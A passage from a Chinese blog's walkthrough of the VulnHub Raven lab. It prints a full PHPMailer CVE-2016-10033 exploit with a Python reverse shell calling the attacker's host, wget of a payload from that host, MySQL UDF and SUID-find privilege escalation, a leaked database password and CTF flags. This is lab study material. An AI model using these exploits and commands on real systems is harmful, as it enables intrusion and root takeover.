alt="image-20230626102846814"></p><ul><li>目标开启了以下端口及服务：<ul><li>22端口，服务为OpenSSH 6.7p1;且系统为Debian 5+deb8u4</li><li>80端口，服务为Apacha 2.4.10</li><li>111端口，rpcbind服务</li></ul></li></ul><p>使用Nmap中漏洞分类NSE脚本对目标进行探测</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.134</span><br></pre></td></tr></table></figure><hr><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626103151599.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626103151599.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626103151599"></p><p>同样存在openssh的用户名枚举和栈溢出的SSV-90447可用</p><p>在exploit-db上搜索ssh对应版本的漏洞，或者searchspolit，目标服务器的openssh有用户名枚举漏洞</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625210618990"></p><p>seebug上看到目标主机存在信息泄露和缓冲区溢出漏洞，还有2010年的拒绝服务漏洞（因该漏洞等级较低，实施拒绝服务也较困难所以无视）</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625214035684"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625214249208"></p><p>&#x3D;&#x3D;192.168.101.134主机的22端口存在信息泄露和缓冲区溢出漏洞，seebug还有searchspolit都能找到对应的poc，该轮信息扫描可以用来进行下一步的ssh爆破或溢出漏洞攻击。该信息泄露漏洞定义为中危&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625214826294"></p><p>访问其web服务：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142536853.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142536853.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626142536853"></p><p>在其service.html源码里找到flag1:</p><p>&#x3D;&#x3D;flag1{b9bbcb33e11b80be759c4e844862482d}&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151243145.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151243145.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626151243145"></p><ul><li>目录扫描：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb 192.168.101.135</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626142852924"></p><p>目标网站存在vendor目录，访问一下，发现存在敏感目录遍历</p><blockquote><p>vendor目录一般是指在项目中用于存放第三方库、框架、插件等外部依赖的目录。</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143148450.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143148450.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626143148450"></p><p>还有wordpress目录，该站应该是一个wordpress的框架</p><ul><li>wappalzer分析：</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143024979.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143024979.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626143024979"></p><p>在目录可以看到使用了PHPMailer(功能齐全的PHP电子邮件创建和传输类)</p><p>VERSION目录找到了PHPMailer版本号为5.2.16</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626145333475"></p><h3 id="（2）PHPMailer漏洞攻击"><a href="#（2）PHPMailer漏洞攻击" class="headerlink" title="（2）PHPMailer漏洞攻击"></a>（2）PHPMailer漏洞攻击</h3><p>查找对应的漏洞：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit PHPMailer</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145538957.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145538957.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626145538957"></p><p>PHPMaileer&lt;5.2.18可以进行远程代码执行，使用python版对应的exp：</p><ul><li>把exp复制到当前目录：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/php/webapps/40974.py ./</span><br></pre></td></tr></table></figure><ul><li>攻击机kali开启nc监听，端口为4444</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><ul><li>修改exp，把target改为目标地址，backdoor为写的shell地址，修改反弹shell地址为本机ip，修改后如下：</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192523424.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192523424.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628192523424"></p><p>之所以加contact.php，可以看一下该漏洞成因，是因为输入的邮件地址能包含引号括起来的空格，造成参数注入。所以要找接收邮件参数的页面。就是contact.php</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192319281.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192319281.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628192319281"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests_toolbelt <span class="keyword">import</span> MultipartEncoder</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html <span class="keyword">as</span> lh</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;clear&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; Version 1.0 - github.com/anarcoder - greetings opsxcq &amp; David Golunski\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://192.168.101.134:80/contact.php&#x27;</span><span class="comment">#存在漏洞的目标</span></span><br><span class="line">backdoor = <span class="string">&#x27;/godown.php&#x27;</span><span class="comment">#后门位置</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.101.128\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><span class="comment">#connect到kali ip</span></span><br><span class="line">fields=&#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/var/www/html/godown.php server\&quot; @protonmail.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Pwned&#x27;</span>&#125;<span class="comment">#OQueueDirectory同步改为shell地址</span></span><br><span class="line"></span><br><span class="line">m = MultipartEncoder(fields=fields,</span><br><span class="line">                     boundary=<span class="string">&#x27;----WebKitFormBoundaryzXJpHSq4mNy35tHe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;curl/7.47.0&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;Content-Type&#x27;</span>: m.content_type&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;localhost:8081&#x27;</span>, <span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;localhost:8081&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] SeNdiNG eVIl SHeLL To TaRGeT....&#x27;</span>)</span><br><span class="line">r = requests.post(target, data=m.to_string(),</span><br><span class="line">                  headers=headers)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D&#x27;</span>)</span><br><span class="line">r = requests.get(target+backdoor, headers=headers)</span><br><span class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]  ExPLoITeD &#x27;</span> + target)</span><br></pre></td></tr></table></figure><blockquote><p>提一些其他的知识：vim全选复制：vVGy</p><p>v进入普通可视模式，V进入行可视模式，G把光标易懂到最后一行，y复制选中文本</p></blockquote><p>执行后显示如下结果：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191222883.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191222883.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628191222883"></p><p>现在访问<a href="http://192.168.101.134/godown.php%EF%BC%88%E4%BD%A0%E6%89%80%E5%86%99shell%E4%BD%8D%E7%BD%AE%EF%BC%89%EF%BC%8C%E5%BC%B9%E5%9B%9Eshell">http://192.168.101.134/godown.php（你所写shell位置），弹回shell</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191342876.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191342876.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628191342876"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191357449.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191357449.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628191357449"></p><p>shell为www-data的权限：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191418321.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191418321.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628191418321"></p><p>目标机有python环境</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193135591.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193135591.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628193135591"></p><ul><li>用python pty获取完整交互式shell</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193203637.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193203637.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628193203637"></p><p>查找flag2，flag3:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag* 2&gt;/dev/null</span><br></pre></td></tr></table></figure><blockquote><p>加上<code>2&gt;/dev/null</code>把错误输出丢弃，不然会出现暴多Permission denied的无权限搜索目录信息。</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193757457.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193757457.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628193757457"></p><p>flag2:&#x3D;&#x3D;flag2{6a8ed560f0b5358ecf844108048eb337}&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193853770.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193853770.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628193853770"></p><p>flag3:网页上查看</p><p>&#x3D;&#x3D;flag3{a0f568aa9de277887f37730d71520d9b}&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194012468.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194012468.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628194012468"></p><h3 id="（3）Mysql-UDF提权"><a href="#（3）Mysql-UDF提权" class="headerlink" title="（3）Mysql UDF提权"></a>（3）Mysql UDF提权</h3><p>wordpress下有wordpress的配置文件wp-config.php</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194359329.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194359329.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628194359329"></p><p>数据库账号root，密码R@v3nSecurity</p><p>登录mysql:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -pR@v3nSecurity</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194517437.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194517437.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628194517437"></p><p>且Server version(Mysql)版本为5.5.60。可以用udf提权</p><blockquote><p>udf提权：UDF提权前提是知道数据库root密码</p><ul><li>一般来说mysql&gt;&#x3D;5.1.4 上传udf到mysql\lib\plugin</li><li>如果mysql&lt;5.1.4 别想了，遇不到</li></ul></blockquote><p>查找对应的exp：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit mysql</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628200305919.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628200305919.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628200305919"></p><p>把exp复制到当前路径，并gcc编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/1518.c ./</span><br><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -o  raptor_udf.so 1518.o -lc</span><br></pre></td></tr></table></figure><blockquote><p>gcc各个参数说明：</p><p>-g 生成调试信息</p><p>-shared 生成动态链接库(.so)而不是可执行文件。用以在各个程序共享</p><p>-o 输出文件 1518.o输入文件</p><p>-lc 连接c标准库，提供标准C库函数支持</p></blockquote><p>在kali上起一个web服务，在靶机上下载so</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br><span class="line">或者</span><br><span class="line">python2 -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure><p>靶机执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.101.128:8888/raptor_udf.so</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201426533.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201426533.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628201426533"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201724809.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201724809.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628201724809"></p><p>进入数据库mysql创建数据表foo，向表中插入二进制数据，利用dumpfile函数把文件以root权限写到plugin目录，新建返回类型为整型的函数do_system，别名soname（注意修改load_file的so路径）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> foo(line <span class="type">blob</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> foo <span class="keyword">values</span>(load_file(<span class="string">&#x27;/var/www/html/raptor_udf1.so&#x27;</span>));</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> foo <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/raptor_udf2.so&#x27;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> do_system <span class="keyword">returns</span> <span class="type">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> foo <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> do_system <span class="keyword">returns</span> <span class="type">integer</span> soname <span class="string">&#x27;raptor_udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628211948175.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628211948175.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628211948175"></p><ul><li>find提权</li></ul><p>通过do_system函数给find目录所有者的suid权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212040242.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212040242.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628212040242"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> finn</span><br><span class="line">find finn -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br></pre></td></tr></table></figure><p>完成！看到shell标识变了</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212226260.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212226260.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628212226260"></p><p>uid为root</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212254283.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212254283.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628212254283"></p><p>在root下找到最后一个flag:&#x3D;&#x3D;flag4{df2bc5e951d91581467bb9a2a8ff4425}&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212404358.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212404358.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230628212404358"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透RAVEN1</title>
      <link href="/2023/06/27/vulnhub-ba-ji-raven1/"/>
      <url>/2023/06/27/vulnhub-ba-ji-raven1/</url>
      
        <content type="html"><![CDATA[<h1 id="Raven-1"><a href="#Raven-1" class="headerlink" title="Raven 1"></a>Raven 1</h1><h2 id="一、有效资产收集"><a href="#一、有效资产收集" class="headerlink" title="一、有效资产收集"></a>一、有效资产收集</h2><table><thead><tr><th>资产编号</th><th>资产分类</th><th>资产名称</th><th>资产规格</th><th>访问地址</th><th>备注&#x2F;问题</th></tr></thead><tbody><tr><td>Raven1</td><td>主机系统</td><td>Ubuntu操作系统</td><td>Type:Linux<br />IP:192.168.101.135<br />Port:22、80、111、40695</td><td>192.168.101.135</td><td>openSSH版本较低导致的用户枚举和栈溢出，wordpress存在敏感信息泄露</td></tr></tbody></table><p>flag：</p><p>&#x3D;&#x3D;flag1{b9bbcb33e11b80be759c4e844862482d}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag2{fc3fd58dcdad9ab23faca6e9a36e581c}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag3{afc01ab56b50591e7dccf93122770cd2}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag4{715dea6c055b9fe3337544932f2941ce}&#x3D;&#x3D;</p><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/raven-1,256/">https://www.vulnhub.com/entry/raven-1,256/</a></p><h2 id="二、渗透测试过程"><a href="#二、渗透测试过程" class="headerlink" title="二、渗透测试过程"></a>二、渗透测试过程</h2><p>kali攻击机ip为192.168.101.128</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230624215915330"></p><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><ul><li>通过netdiscover进行二层发现，发现地址为192.168.101.135主机</li></ul><blockquote><p>其他几个主机分别代表：</p><ul><li>192.168.101.1 物理机</li><li>192.168.101.2 网关</li><li>192.168.101.254 DHCP服务器</li></ul></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.101.0/24</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141708005.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141708005.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626141708005"></p><ul><li>通过ping进行三层发现，根据ttl&#x3D;64初步推测该主机为Linux</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.135</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141742326.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141742326.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626141742326"></p><ul><li>通过masscan四层发现目标主机开放端口</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 